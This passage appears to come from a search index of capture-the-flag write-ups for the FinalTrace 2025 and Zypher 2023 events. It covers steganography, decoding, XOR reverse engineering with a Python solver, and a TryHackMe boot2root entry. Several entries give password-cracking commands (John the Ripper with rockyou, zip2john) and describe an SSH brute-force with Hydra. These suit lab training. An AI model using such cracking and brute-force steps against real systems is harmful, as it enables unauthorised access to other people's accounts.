renaminggzip -dc stage0.bin &gt; stage1.bz2What this does: The gzip layer contains a .bz2 file. After decompression you should have the bzip2 file (e.g., stage1.bz2).Verification:file stage1.bz2# Expected: stage1.bz2: bzip2 compressed data, ...Step 3: Decompress the bzip2 file to get the Base64 textbunzip2 stage1.bz2# Produces an ASCII text file (e.g., 'stage1.txt')file stage1.txthead -n 5 stage1.txtWhat this does: bunzip2 extracts the text file that contains the Base64-encoded flag (encoded twice).Step 4: Decode the Base64 text twicecat stage1.txt | base64 -d | base64 -d &gt; flag.txtcat flag.txtWhat this does: The text is decoded twice using base64 -d. The final output reveals the hidden flag.FlagCYS{lyra_was_here}" }, { "title": "Auditor Encounter", "url": "/writeups/FinalTrace_2025/41-challenge-name.html", "categories": "Web / ARG", "tags": "", "date": "", "snippet": " Category: Web / ARG Author: OviyaChallenge DescriptionIn this challenge, you encounter The Auditor, a mysterious entity that reviews your actions in the fractured timeline.Through an interactive...", "content": " Category: Web / ARG Author: OviyaChallenge DescriptionIn this challenge, you encounter The Auditor, a mysterious entity that reviews your actions in the fractured timeline.Through an interactive dialogue, you must respond to his questions about your past interference in the archive.Each response leads to a different outcome — hidden clues, distinct checksums, and unique session identifiers, all combining to form your final flag.The true test lies in observation and deduction — the data is never handed over directly, but concealed cleverly in the background.SolutionInitial AnalysisOn opening the webpage, the interface shows The Auditor, who initiates a conversation in a typewriter-style effect.After a few exchanges, the player is presented with four choices, each representing a possible action from the past.Inspecting the code reveals a fetch() request silently retrieving a hidden resource (which in this case is disguised or embedded), and a flag format hint inside the script logic.The flag format is:CYS{audit_recovered__}---Tools Used Web Browser (Developer Tools → Network &amp; Sources) Basic JavaScript inspection Notepad / VS Code for viewing HTML sourceStep-by-Step SolutionStep 1: Observation and InteractionWhen the page loads, The Auditor introduces the scenario and begins questioning your actions.Once prompted, four choices appear, each corresponding to a distinct decision path.Step 2: Inspecting the Network or ScriptUpon selecting any choice, no flag is directly revealed.However, by checking the Developer Tools → Sources or Network tab, you can find that the hidden clue is retrieved or encoded within the script itself.Each path outputs a checksum and sessionID that you must fit into the given flag format.Step 3: Reconstructing the FlagUsing the format and the given data, you reconstruct your flag as:CYS{audit_recovered__}---Path Outcomes and FlagsEach decision leads to a unique audit result with a distinct checksum and session ID.These combine to form four valid flags depending on the path you choose: Choice Description Checksum SessionID Final Flag Path A “I repaired corrupted echoes — I tried to restore what was lost.” 1A3F 07XZ CYS{audit_recovered_1A3F_07XZ} Path B “I smashed the capsules — they were unstable and had to be purged.” B2D4 9KLM CYS{audit_recovered_B2D4_9KLM} Path C “I reconfigured terminals to read restricted vaults — truth needed access.” C3E7 Q4T1 CYS{audit_recovered_C3E7_Q4T1} Path D “I observed only. I let the archive run its course.” D4F9 Z0OP CYS{audit_recovered_D4F9_Z0OP} Explanation of Paths Each path represents a different moral response to the Auditor’s inquiry. The checksum and sessionID act as identifiers for the version of the timeline recovered. These unique flags determine which branch of the overarching story or challenge you progress into next.Flag ExampleIf the player selects the first option:CYS{audit_recovered_1A3F_07XZ}—" }, { "title": "CryptoEZ", "url": "/writeups/FinalTrace_2025/42-cryptoez.html", "categories": "General", "tags": "", "date": "", "snippet": "CryptoEZCategory: CryptographyAuthor: Abhay KrishnaThis challenge explores the basics of image cryptography with basic concepts like EXIF metadata and steganographyInitial AnalysisAs the descriptio...", "content": "CryptoEZCategory: CryptographyAuthor: Abhay KrishnaThis challenge explores the basics of image cryptography with basic concepts like EXIF metadata and steganographyInitial AnalysisAs the description suggests there is something hidden inside the message it is very common and basic to view the metadata of the Image.Tools Used Online EXIF data viewer ZstegStep-by-Step SolutionStep 1: Check EXIF MetadataOn viewing the metadata of the image we can see a hint saying “Listen to the least significant whispers”. This indicates the use of LSB steganography - a technique for hiding secret data by replacing the least significant bits (LSBs) of a carrier file, like an image, with the bits of the hidden message.Step 2: Use Steganography ToolsTo solve this we can use tools like zsteg which is used for detecting and extracting steganographic data from images.Step 3: Extract Hidden DataOn running the command:```shellzsteg flag.pngb1,r,lsb,xy .. text: “&lt;~^#vS\\p”b1,g,msb,xy .. file: OpenPGP Secret Keyb1,rgb,lsb,xy .. text: “CYS{y0u_kn0w_cryp70}”b4,r,lsb,xy .. text: “vU\"#4\"$DDDD3#C2 “b4,g,lsb,xy .. text: “##DEEVfeef”b4,b,lsb,xy .. text: “\"3EUUUEEEEfw”b4,rgb,lsb,xy .. text: “`U’rw’rw’qf”b4,bgr,lsb,xy .. text: “Pw’rw’rw&amp;af”Flag: CYS{y0u_kn0w_cryp70}" }, { "title": "Lyra's Journal", "url": "/writeups/FinalTrace_2025/43-challenge-description.html", "categories": "Forensics", "tags": "", "date": "", "snippet": " Category: [Forensics] Author: [Nihara Oommen]Challenge Description[There are 15 such fragments scattered across files. Each fragment is appended into some of the JPEG files as plain ASCII in the...", "content": " Category: [Forensics] Author: [Nihara Oommen]Challenge Description[There are 15 such fragments scattered across files. Each fragment is appended into some of the JPEG files as plain ASCII in the raw bytes in the form CYS{fragment} YYYY-MM-DDTHH:MM:SS. Sorting the found fragments by timestamp reveals the final flag.]SolutionInitial Analysis[I inspected the provided files and the generator script. The images looked normal in viewers, so I suspected the fragments were embedded in the raw file bytes (not visible pixels). The pattern CYS{ suggested a simple ASCII string was appended to some JPEG files.]Tools Used Select-String (PowerShell) sort-object (PowerShell) unzip (to extract the challenge ZIP) PowerShell Python (optional, for automation)Step-by-Step SolutionStep 1: Extract the filestar -xf journal_pages.zipExtracts all page_###.jpg into journal_pages/ for inspection.Step 2: Find the hidden fragmentsSelect-String -Path .\\journal_pages\\*.jpg -Pattern \"CYS{\" | ForEach-Object { $_.Line }This finds lines like:CYS{T} 2087-09-22T00:12:00CYS{H} 2087-09-22T00:21:00...(Each hit is the fragment plus its timestamp.)Step 3: Sort fragments by timestamp and assemble the flagSelect-String -Path .\\journal_pages\\*.jpg -Pattern \"CYS{\" | ForEach-Object { $line = $_.Line if ($line -match \"CYS\\{([^}]+)\\}\\s*([0-9T:-]+)\") { [PSCustomObject]@{ Fragment = $matches[1]; Timestamp = [datetime]::ParseExact($matches[2],\"yyyy-MM-ddTHH:mm:ss\",$null) } }} | Sort-Object Timestamp | ForEach-Object { $_.Fragment } &gt; sorted_fragments.txtExplanation: after sorting by the ISO timestamps, concatenating the fragments in order reconstructs the inner flag message.FlagCYS{THE_CLOCKS_WERE_LYING}" }, { "title": "Echo-Double Combat", "url": "/writeups/FinalTrace_2025/44-echo-double-combat.html", "categories": "Reverse Engineering", "tags": "", "date": "", "snippet": "Echo-Double Combat Category: Reverse Engineering Author: Suraj KumarChallenge DescriptionA binary executable accepts a 9-character input key and validates it through XOR operations. The correct k...", "content": "Echo-Double Combat Category: Reverse Engineering Author: Suraj KumarChallenge DescriptionA binary executable accepts a 9-character input key and validates it through XOR operations. The correct key is encoded in the binary and must be extracted by XORing stored bytes with 0x55. Once the correct key is entered, the binary decrypts and reveals the flag using repeating-key XOR. A decoy flag is stored in encrypted form as a Base64 string (WTNsemUyY3dYMkkwWTJ0ZmREQmZjM1EwY25SemZRPT0=) in the binary’s strings, which decodes to cys{g0_b4ck_t0_st4rts} — this is intentionally wrong and serves as a red herring.SolutionInitial AnalysisRunning basic reconnaissance on the binary revealed an encrypted decoy flag in the strings output. Further analysis required disassembling the binary to understand the validation logic and extract the encoded key array used for XOR operations.Tools Used Ghidra / IDA Pro / Binary Ninja strings, file, objdump, readelf Python 3 base64 (command-line tool) GCCStep-by-Step SolutionStep 1: Initial Analysisfile challenge.datstrings challenge.datFound a Base64-encoded string WTNsemUyY3dYMkkwWTJ0ZmREQmZjM1EwY25SemZRPT0=. Decoding it twice reveals cys{g0_b4ck_t0_st4rts} which is a decoy flag (intentionally wrong). The binary requires a 9-character key as input.Step 2: Decode the Decoy (Red Herring)echo \"WTNsemUyY3dYMkkwWTJ0ZmREQmZjM1EwY25SemZRPT0=\" | base64 -d | base64 -d# Output: cys{g0_b4ck_t0_st4rts}This decoy flag is not the answer and will fail if used as input. It exists to mislead players who rely only on strings output.Step 3: Extract Encoded Arrays from Binaryobjdump -s -j .data challenge.dat# orreadelf -x .data challenge.datLocated two arrays in the .data section:key_enc: 34 39 3a 3d 3a 38 3a 27 34flag_enc: 12 5f 0c 1a 5c 19 30 43 12 3e 19 01 59 5f 0e 04 17 05Step 4: Analyze Validation Logic in DisassemblerOpened the binary in Ghidra and decompiled the main function. Identified the key derivation and validation:unsigned char key[9];for (int i = 0; i &lt; 9; i++) { key[i] = key_enc[i] ^ 0x55;}// Read input and compareif (memcmp(input, key, 9) == 0) { // Decrypt flag with repeating-key XOR for (int i = 0; i &lt; 18; i++) { flag[i] = flag_enc[i] ^ key[i % 9]; }}Step 5: Compute the Real Keykey_enc = bytes.fromhex('34393a3d3a383a2734')key = bytes(b ^ 0x55 for b in key_enc)print(key.decode()) # Output: alohomoraThe real key is: alohomoraStep 6: Decrypt the Flagflag_enc = bytes.fromhex('125f0c1a5c193043123e1901595f0e041705')key = b'alohomora'flag = bytes(flag_enc[i] ^ key[i % 9] for i in range(len(flag_enc)))print(flag.decode()) # Output: s3cr3t_1s_un10ckedStep 7: Verify and Retrieve Flag./challenge.datSpeak the binding spell: alohomoraFlag: cys{s3cr3t_1s_un10cked}Successfully retrieved the real flag by entering the correct key.Python solver scriptFlagcys{s3cr3t_1s_un10cked}solver python codethe code could change for new binary file as hex dump locations might change#!/usr/bin/env python3“””Solver for the Echo-Double ChallengeBased on the decompiled code analysis“””def extract_data_from_binary(filename=’l’): “\"”Extract data from the binary file””” try: with open(filename, ‘rb’) as f: data = f.read() print(f\"[+] File size: {len(data)} bytes (0x{len(data):x})\") # The addresses are 0x404060 and 0x404070 # We need to find the file offset for these virtual addresses # Common data section offsets to try possible_offsets = [ 0x3060, # 0x404060 - 0x401000 (common base) 0x2060, # Alternative 0x4060, # Alternative (if base is 0x400000) 0x3040, # Another common offset ] for base_offset in possible_offsets: offset_60 = base_offset offset_70 = base_offset + 0x10 if offset_60 + 9 &lt;= len(data) and offset_70 + 18 &lt;= len(data): data_404060 = data[offset_60:offset_60+9] data_404070 = data[offset_70:offset_70+18] print(f\"\\n[*] Trying base offset: 0x{base_offset:04x}\") print(f\" data_404060 (offset 0x{offset_60:04x}): {data_404060.hex()}\") print(f\" data_404070 (offset 0x{offset_70:04x}): {data_404070.hex()}\") # Try to decode and check if it makes sense result = solve_with_data(data_404060, data_404070) if result and result['valid']: return result # If nothing worked, try scanning the file print(\"\\n[*] Trying to scan entire file for valid patterns...\") return scan_for_data(data) except FileNotFoundError: print(f\"Error: File '{filename}' not found\") return Noneexcept Exception as e: print(f\"Error: {e}\") import traceback traceback.print_exc() return Nonedef scan_for_data(data): “\"”Scan the file for potential encoded data””” print(“[*] Scanning for 9-byte sequences that decode to printable ASCII…”)candidates = []for i in range(len(data) - 9): # Try XORing with 0x55 spell = bytearray() valid = True for j in range(9): char = data[i+j] ^ 0x55 if char &lt; 0x20 or char &gt; 0x7e: # Not printable ASCII valid = False break spell.append(char) if valid: spell_str = spell.decode('ascii') print(f\" Found at offset 0x{i:04x}: {spell_str}\") candidates.append((i, data[i:i+9]))if candidates: print(f\"\\n[*] Found {len(candidates)} candidate(s)\") # Use the first candidate offset, data_404060 = candidates[0] # Look for data_404070 nearby (16 bytes after) data_404070 = data[offset+16:offset+16+18] if offset+16+18 &lt;= len(data) else None if data_404070: print(f\"[*] Using data at offset 0x{offset:04x}\") return solve_with_data(data_404060, data_404070)return Nonedef solve_with_data(data_404060, data_404070): “\"”Solve the challenge with extracted data”””# Step 1: Calculate the spell (key)# var_1d[i] = data_404060[i] ^ 0x55spell = bytearray()for i in range(9): spell.append(data_404060[i] ^ 0x55)print(f\"\\n[+] Calculated Spell:\")print(f\" Hex: {spell.hex()}\")# Try to decode as ASCIItry: spell_str = spell.decode('ascii') print(f\" ASCII: {spell_str}\") is_printable = all(32 &lt;= b &lt;= 126 for b in spell)except: spell_str = spell.decode('ascii', errors='replace') print(f\" ASCII (with errors): {spell_str}\") is_printable = False# Step 2: Decode the flag (Mirror Key)# var_88[i] = var_1d[i % 9] ^ data_404070[i]flag = bytearray()for i in range(18): flag.append(spell[i % 9] ^ data_404070[i])print(f\"\\n[+] Decoded Mirror Key:\")print(f\" Hex: {flag.hex()}\")# Try to decode as ASCIItry: flag_str = flag.decode('ascii') print(f\" ASCII: {flag_str}\") flag_printable = all(32 &lt;= b &lt;= 126 for b in flag)except: flag_str = flag.decode('ascii', errors='replace') print(f\" ASCII (with errors): {flag_str}\") flag_printable = Falseprint(f\"\\n{'='*60}\")print(f\"SOLUTION:\")print(f\"{'='*60}\")print(f\"Ancient Spell to Enter: {spell_str}\")print(f\"Mirror Key (Flag): {flag_str}\")print(f\"{'='*60}\\n\")return { 'spell': spell_str, 'flag': flag_str, 'valid': is_printable and flag_printable}def manual_solve(): “\"”Manual solver - paste your hex data here””” print(“=”60) print(“MANUAL MODE”) print(“=”60) print(“Enter the hex data from the binary\\n”) print(“To get the data manually, use:”) print(“ readelf -x .data l”) print(“ or”) print(“ objdump -s -j .data l”) print()data_404060_hex = input(\"Enter data_404060 (9 bytes in hex, e.g., 1a2b3c...): \").strip()data_404070_hex = input(\"Enter data_404070 (18 bytes in hex, e.g., 4d5e6f...): \").strip()try: # Remove spaces and common separators data_404060_hex = data_404060_hex.replace(\" \", \"\").replace(\"0x\", \"\") data_404070_hex = data_404070_hex.replace(\" \", \"\").replace(\"0x\", \"\") data_404060 = bytes.fromhex(data_404060_hex) data_404070 = bytes.fromhex(data_404070_hex) if len(data_404060) != 9: print(f\"Error: data_404060 should be 9 bytes, got {len(data_404060)}\") return if len(data_404070) != 18: print(f\"Error: data_404070 should be 18 bytes, got {len(data_404070)}\") return print() solve_with_data(data_404060, data_404070) except ValueError as e: print(f\"Error parsing hex: {e}\")def main(): import sysprint(\"=\"*60)print(\"Echo-Double Challenge Solver\")print(\"=\"*60)print()# Get filenameif len(sys.argv) &gt; 1: filename = sys.argv[1]else: filename = 'l'# Try automatic extraction firstprint(f\"[*] Attempting automatic data extraction from '{filename}'...\\n\")result = extract_data_from_binary(filename)if not result: print(\"\\n\" + \"=\"*60) print(\"Automatic extraction failed. Switching to manual mode...\") print(\"=\"*60) print() manual_solve()if name == “main”: main()" }, { "title": "Level 1 - Discord Server", "url": "/writeups/Zypher_2023/level-01-discord-server.html", "categories": "general", "tags": "", "date": "", "snippet": "ChallengeCheckout our Discord ServerSolutionJoin the Discord Server with the link provided and you get to see the following channelsYour goal is to locate the flag. In #announcements channel you ca...", "content": "ChallengeCheckout our Discord ServerSolutionJoin the Discord Server with the link provided and you get to see the following channelsYour goal is to locate the flag. In #announcements channel you can see the flag inbetween the rules as show in the image below 👇🏻That’s it! You’ve successfully completed Level 1 by following the hints and rules." }, { "title": "Level 2 - Email Header", "url": "/writeups/Zypher_2023/level-02-email-header.html", "categories": "cryptography, forensics", "tags": "", "date": "", "snippet": "ChallengeYou have given a Message.emlHints Check for authenticity of the email Analyse DKIM-SIGNATURE in the email header Decrypt the cipher using ROT13 SolutionDownload the giv...", "content": "ChallengeYou have given a Message.emlHints Check for authenticity of the email Analyse DKIM-SIGNATURE in the email header Decrypt the cipher using ROT13 SolutionDownload the given .eml fileCheck for the DKIM-SIGNATURE (A DKIM signature in an email header is a cryptographicstamp that verifies the authenticity of the email. Usually it uses rsa256 for encryption but here we used ROT13 weak cipher text for encryption)DKIM-Signature: v=3D1; a=3Drot13; c=3Dsimple/simple; d=3Dtech=2Ecom; i=3D@tech=2Ecom; q=3Ddns/txt; s=3Dmain; t=3D169784749; x=3D17293849; h=3Dmime-version:from:to:subject:message-id:date; p=3Dmlc{Jrypbzrgbmlcurdhrfg_0012}Decrypt the cipher using ROT13 to get the flag" }, { "title": "Level 3 - Password Protected PDF", "url": "/writeups/Zypher_2023/level-03-pdf.html", "categories": "general", "tags": "", "date": "", "snippet": "ChallengeYou are given a PDFSolutionYou need to first extract the crackable information from the file using John the Ripper tool.$ pdf2john.py unknown.pdf &gt; hashNow, crack the hash using John th...", "content": "ChallengeYou are given a PDFSolutionYou need to first extract the crackable information from the file using John the Ripper tool.$ pdf2john.py unknown.pdf &gt; hashNow, crack the hash using John the Ripper tool.$ john hash --wordlist=/usr/share/wordlists/rockyou.txt hashNow, you can see the password for the PDF file is mystery. Use this password to open the PDF file and you will get the flag." }, { "title": "Level 4 - Leo's Sinister Bellow", "url": "/writeups/Zypher_2023/level-04-leo-sinister.html", "categories": "steganography, forensics", "tags": "", "date": "", "snippet": "ChallengeThis is a basic forensics challenge. You are given an image file Leo’s Sinister BellowSolutionFirst thing to do in any steganography challenge is an exiftool check. This will tell you if t...", "content": "ChallengeThis is a basic forensics challenge. You are given an image file Leo’s Sinister BellowSolutionFirst thing to do in any steganography challenge is an exiftool check. This will tell you if there is anything hidden in the metadata of the image$ exiftool 1.pngUnfortunately, there is nothing in the metadata. Next, we can use binwalk to check for any hidden files in the image.$ binwalk 1.pngWe can see that there are no files hidden in the image. This means that some otherencoding technology has been used.The description asks us the examine the image closely.With this information we can suspect that the method used for hiding the flag is LSBencoding.In order to perform LSB extraction, we will need some tools.The tool I will be using is stegolsbhttps://pypi.org/project/stego-lsb/Running the stego-lsb tool on the image gives us the flag.$ stegolsb steglsb -r -i Chall.png -o out.txt -n 1$ cat out.txt | grep zyp" }, { "title": "Level 5 - YouTube Video", "url": "/writeups/Zypher_2023/level-05-youtube-video.html", "categories": "general", "tags": "", "date": "", "snippet": "ChallengeA YouTube video link is given YouTube VideoSolutionThe flag is hidden in the Subtitles of the video. You can see the subtitles by clicking on the CC button in the video.At 1:28, you can se...", "content": "ChallengeA YouTube video link is given YouTube VideoSolutionThe flag is hidden in the Subtitles of the video. You can see the subtitles by clicking on the CC button in the video.At 1:28, you can see the flag.The flag is in foriegn language. You can translate it using Google Translate." }, { "title": "Level 6 - Der Anfang", "url": "/writeups/Zypher_2023/level-06-der-anfang.html", "categories": "osint, steganography", "tags": "", "date": "", "snippet": "ChallengeAn image file is given. Der AnfangSolutionThe link to the social media post is given in the meta data of the image file in the id name of UserComment and the meta data can be viewed using ...", "content": "ChallengeAn image file is given. Der AnfangSolutionThe link to the social media post is given in the meta data of the image file in the id name of UserComment and the meta data can be viewed using exiftool.$ exiftool der_Anfang.jpgIn the reddit post the link to the git history is salted and placedLink after removing unwanted special characters 👇🏻https://github.com/yshui/picom/commit/a2bcf94ce8fa7216f69fb6ace2c1b3776bdce823The flag is in the commit message." }, { "title": "Level 7 - Audio", "url": "/writeups/Zypher_2023/level-07-audio.html", "categories": "spectography, forensics", "tags": "", "date": "", "snippet": "ChallengeA audio file is given 4UDI0.mp3SolutionAudacity can be used to view the spectogram to an audioImport the audio file in the projectA waveform will be displayedRight click the track and choo...", "content": "ChallengeA audio file is given 4UDI0.mp3SolutionAudacity can be used to view the spectogram to an audioImport the audio file in the projectA waveform will be displayedRight click the track and choose spectrogramThe flag is displayed in the spectrogram at 6 seconds" }, { "title": "Level 8 - Z0D1AC", "url": "/writeups/Zypher_2023/level-08-zodiac.html", "categories": "cryptography", "tags": "", "date": "", "snippet": "ChallengeYou have given a file Z0D1ACSolutionView the file contents using cat$ cat Z0D1ACSo we can copy the binary and use an online decoder to convert the binary to human readable text.Now we get ...", "content": "ChallengeYou have given a file Z0D1ACSolutionView the file contents using cat$ cat Z0D1ACSo we can copy the binary and use an online decoder to convert the binary to human readable text.Now we get this new ciphered test which contains the coordinates of the location. This is base64 encoded. So we can use an online decoder to decode the text.Enclose the result in zyp{} as the flag format." }, { "title": "Level 9 - f0x3rr", "url": "/writeups/Zypher_2023/level-09-f0x3rr.html", "categories": "web, osint", "tags": "", "date": "", "snippet": "ChallengeYou are given a websiteSolutionIn the website, f0x3rr is a endpointClick Download and a file will be downloadedConvert this decimal to string using online converter and you’ll get a github...", "content": "ChallengeYou are given a websiteSolutionIn the website, f0x3rr is a endpointClick Download and a file will be downloadedConvert this decimal to string using online converter and you’ll get a github and in the issue section there will be a password hidden in the conversationPassword is zero-dayWhen you visit the endpoint, click the download button and you’ll Zypher event posterScan the QR code and you’ll get a base64 encoded string, decode it and you’ll get a link an endpoint /vitcyscomzypherGo to the endpoint and download the fileConvert the binary to stringDecoding the Caesar cipher" }, { "title": "Level 10 - Zypher Quest 1", "url": "/writeups/Zypher_2023/level-10-zypher-quest-1.html", "categories": "general, linux", "tags": "", "date": "", "snippet": "ChallengeYou are given a file ZypherQuestSolutionAs the file don’t have any extension, we can use file command to check the file typeYou can see it is a zip file. Now use unzip to extract the fileY...", "content": "ChallengeYou are given a file ZypherQuestSolutionAs the file don’t have any extension, we can use file command to check the file typeYou can see it is a zip file. Now use unzip to extract the fileYou can see the extracted file is a gzip file which is archived using tar. You can see 3 new files have been extracted.You may want to read the following files but skipping that, we check the filetype for Seal.The given file is a bzip2 compressed data. To unzip the file, we can firstlyrename the file to add .bz2 extension and proceed to unzip it using bzip2. Thisgives us a tar file which can be further extracted using tar.mv Seal Seal.bz2bzip2 -d Seal.bz2tar -xvf SealInstead of these 3 steps we can directly uncompressed the given data “Seal”using tar -xjf command.We can see new files have been uncompressed. We also see a file namedStart.sh which is a script file. We can try running this using ./Start.sh. Running itessentially does nothing but delete old files cluttering the screen if theyweren’t already deleted. We can try and read some files to try and get someclues. Here the file Admin looks interesting. Checking its file type, we see it is another tar file.Extracting it gives us a file name Z0d1aCisWatching. We again check the filetype and try decompressing it.Further checking the decompressed file (data in this case) We see a tar fileagain. Decompressing it gives an interesting file.Checking its file type shows there are no permissions assigned to the given file. So, we used chmod 444 or chmod +r to make the file readable." }, { "title": "Level 11 - Zypher RE", "url": "/writeups/Zypher_2023/level-11-zypher-re.html", "categories": "reverse_engineering", "tags": "", "date": "", "snippet": "ChallengeYou are given a Zypher_RE.py fileSolutionOn running the file, it asks for the username that is ‘FOX3R’ as evidentfrom this part of codedef ui_flow(): intro() if username=='FOX3R': ...", "content": "ChallengeYou are given a Zypher_RE.py fileSolutionOn running the file, it asks for the username that is ‘FOX3R’ as evidentfrom this part of codedef ui_flow(): intro() if username=='FOX3R': while loop: menu() else: print(\"Access denied\")ui_flow()After providing the username as input, we get some messages pertainingto the overall theme of the CTF event, ZYPHER.Choosing the Rabbit option leads us to nowhere. It must be a rabbit hole asthe name suggests.Choosing the enter key option, it asks for a key that leads us to the keyfunctiondef key(x): if x==hashlib.sha256(salt.encode('utf-8')).hexdigest()[4]: return Truesalt = \"ZYPHER\"We can find x by running this piece of code(encrypting salt using SHA256after encoding it in utf-8 format)import hashlibimport cryptography.fernet import Fernetimport base64salt = \"ZYPHER\"hashlib.sha256(salt.encode('utf-8')).hexdigest()hashlib.sha256(salt.encode('utf-8')).hexdigest()[4]Now that we have found the key, let us inspect the encrypt() functiondef encrypt(flag,key): enc=''.join([chr((ord(flag[i]) &lt;&lt; key) + ord(flag[i + 1]))+chr(ord(salt[random.randint(1, 10)])&lt;&lt;key) for i in range(0, len(flag), 2)]) print(enc) return encdef decrypt(enc_text,key): ... #return flag #use the flag to unlock file#encrypt('FLAG', x)We’ve found the key as 8The encrypt function takes the flag encrypts it with the key and returns theciphertext(enc)The program is prompting us to write a decrypt function to take theciphertext and key as parameters and return the original flag.Also the ciphertext is already given in this part of codesalt='ZYPHER'secret_key_prior='hacker{'secret_key_main='匴倀义刀㕙䌀弱䬀㝔䬀㙃䄀呟刀'secret_key_latter='}'Carefully investigating the encryption code, we see that the program shiftsthe bits for every other letter of the flag, left by 8 bits (1 byte). Then, it adds the next letter of the flag to the shifted value .Also every other letter of ciphertext is just a random character.We can reverse this by first removing/skipping through the randomcharacters.Then we shift the bits right to get the first letter in the pair and convert theencoded character to bytes and get the last byte to get the second letter inthe pair. The following code decrypt.pyc='匴倀义刀㕙䌀弱䬀㝔䬀㙃䄀呟刀'a=''for i in range(0,len(c),2): e=chr(ord(c[i])&gt;&gt;8) a+=e a+=chr(ord(c[i])-(ord(e)&lt;&lt;8))print(a)Here ‘a’ is the final flag. We have step 2 in range to skip the randomcharactersOn running this decryption code, we get the flag as S4NI5Y_17T6CT_" }, { "title": "Level 12 - PCAP", "url": "/writeups/Zypher_2023/level-12-pcap.html", "categories": "forensics, network", "tags": "", "date": "", "snippet": "ChallengeYou are given a network_mitm.pcap fileSolutionExtract contents using NetworkMinerLoad in the pcap file and extract the zip fileExtract flag.zip using hashed password inside welcome.pdfDecr...", "content": "ChallengeYou are given a network_mitm.pcap fileSolutionExtract contents using NetworkMinerLoad in the pcap file and extract the zip fileExtract flag.zip using hashed password inside welcome.pdfDecrypt hashing using CrackStationExtract the files using password welC0me$ cat flag.txt" }, { "title": "Level 13 - NFT", "url": "/writeups/Zypher_2023/level-13-nft.html", "categories": "misc", "tags": "", "date": "", "snippet": "ChallengeYou have been given a file called image.nftHints Look at this hintSolutionDownload the fileHere Z0d1ac_1 seems to look like a username. Let’s google digital market for sea of art and see ...", "content": "ChallengeYou have been given a file called image.nftHints Look at this hintSolutionDownload the fileHere Z0d1ac_1 seems to look like a username. Let’s google digital market for sea of art and see if something related to nfts comes up.The first link itself comes up to be the biggest nft marketplace and we the link the word sea to opensea from previous hint. Lets lookup for Z0d1ac_1 username in opensea.On the profile page of Z0d1ac_1 you can see the same nft as image.nft file, openthe NFTIn the description it key is mastermindWhen you look in the item activity section, you’ll find transfers between different entities of Z0d1ac but one suspicious account involved in all these transfers is RU55I4N_M45T3RWhen you look for the RU55I4N_M45T3R username, you’ll find another NFTIn the description you can see the reward linkGo to https://www.dcode.fr/cipher-identifier and look for possible ciphersHere we can see that highest probability is for ASCII Code" }, { "title": "Level 14 - Zypher Quest 2", "url": "/writeups/Zypher_2023/level-14-zypher-quest-2.html", "categories": "cryptography", "tags": "", "date": "", "snippet": "ChallengeYou have been given a file 7.1.zipSolutionWe know that the files are RSA encrypted since we are given private keys for each of them We will use the following command to decrypt each of the...", "content": "ChallengeYou have been given a file 7.1.zipSolutionWe know that the files are RSA encrypted since we are given private keys for each of them We will use the following command to decrypt each of themopenssl pkeyutl -decrypt -inkey private_key1.pem -in encrypted_file1.bin -out decrypted_chat1.txtopenssl pkeyutl -decrypt -inkey private_key2.pem -in encrypted_file2.bin -out decrypted_chat2.txtopenssl pkeyutl -decrypt -inkey private_key3.pem -in encrypted_file3.bin -out decrypted_chat3.txt" }, { "title": "Level 15 - Zypher Quest 3", "url": "/writeups/Zypher_2023/level-15-zypher-quest-3.html", "categories": "forensics, linux", "tags": "", "date": "", "snippet": "ChallengeYou have been given a file auth.log.zipSolutionWe can see that the zip file is password-protectedSo we have to use a dictionary-based attack tool to brute-force the password$ zip2john auth...", "content": "ChallengeYou have been given a file auth.log.zipSolutionWe can see that the zip file is password-protectedSo we have to use a dictionary-based attack tool to brute-force the password$ zip2john auth.log.zip &gt; auth.txtThis will give you the password, use it to unzip the file and go through itAs we can see the attacker used SSH brute force to hack into the machineThe answer is SSH bruteforce (hydra)" }, { "title": "Level 16 - level8z2", "url": "/writeups/Zypher_2023/level-16-level8z2.html", "categories": "boot2root, cryptography, steganography", "tags": "", "date": "", "snippet": "ChallengeYou have been given a Tryhackme linkSolutionYou will be getting an IP address when you start your machine 10.0.2.18, you can proceed to conduct an Nmap scan to gain insights into the targe...", "content": "ChallengeYou have been given a Tryhackme linkSolutionYou will be getting an IP address when you start your machine 10.0.2.18, you can proceed to conduct an Nmap scan to gain insights into the target network. We’ll use a comprehensive scan to check all available ports and enable version detection to identify the services running on those ports.Exploring FTP and SSH ServicesIn the Nmap results for IP address 10.0.2.18, we observed that the FTP and SSH services are open and accessible. This presents an opportunity to investigate these services further.We’ll start by focusing on FTP (File Transfer Protocol) and explore the possibility of anonymouslogin. Anonymous FTP login is a common way to access publicly available files without the need for authentication.In the course of our exploration, we discovered an ‘introduction.txt’ file on the FTP server, which contains the username ‘zodiclown’. Now that we have the username and are aware that theSSH service is available, we can attempt to gain access to the system via SSH. However, access requires a password, and to uncover it, we will employ a password brute-force approach using a tool like ‘Hydra’ to systematically try various password combinations in an attempt togain entry.Upon utilizing Hydra for a password brute-force attack, we successfully retrieved the password, which is cookie. With the obtained credentials in hand, we can now proceed to access the system via SSH and embark on an exploration to uncover the content and resources it holdsAfter successfully logging in via SSH, we decided to check the list of users present on the system, which can be found in the /etc/passwd file. In doing so, we discovered the existence of two user accounts, zodiclown and zodiac. This observation led us to the inference that the zodiac user account may hold significant information, motivating us to explore its home directory and potentially gain root-level access.We again go back to zodiclown’s home folder, we found two folders named chitchat and plans. Both folders contained numerous files, but the key clue was discovered in the chitchat/personal_conv.txt file. This file revealed an image link, which serves as an intriguing lead for our further investigation.Following the provided image link, we encountered an image featuring Gothic Z. We proceeded to download this image and initiated our steganographic skills for analysis. This technique involves examining the image for hidden information or messages concealed within it.Utilizing initial tools like exiftool and strings, we uncovered a passphrase, which turned out tobe topsecret. This discovery strongly suggested the presence of hidden information within the image. With this in mind, we applied steghide to extract concealed data, revealing a file containing a Drive link associated with Zodiac’s activities.Upon accessing the Drive link, we encountered a hexhue. To decode this information, we utilized the online tool found at https://www.dcode.fr/hexahue-cipherAfter deciphering, the result revealed the password ERD3NC0RP, which granted us access asthe root user, further advancing our investigation.After obtaining the root password and successfully logging in, we navigated to the zodiac user’s home directory. Inside this directory, we encountered a Final_Flag folder. Within the Final_Flag folder were six text files. The final text file, upon inspection, revealed the flag." }, { "title": "CYSCOM JUICE SHOP WALKTHROUGH", "url": "/writeups/Cyscom%20Juice%20Shop%202025/writeup.html", "categories": "web, ctf", "tags": "sql-injection, xss, ssti, idor, authentication", "date": "2025-01-01", "snippet": "![](imagedata/logo.png)The CYSCOM JUICE SHOP, like OSWAP Juice Shop, includes a broad spectrum of vulnerabilities from simple input-based flaws to logic and design-level flaws. Understanding the 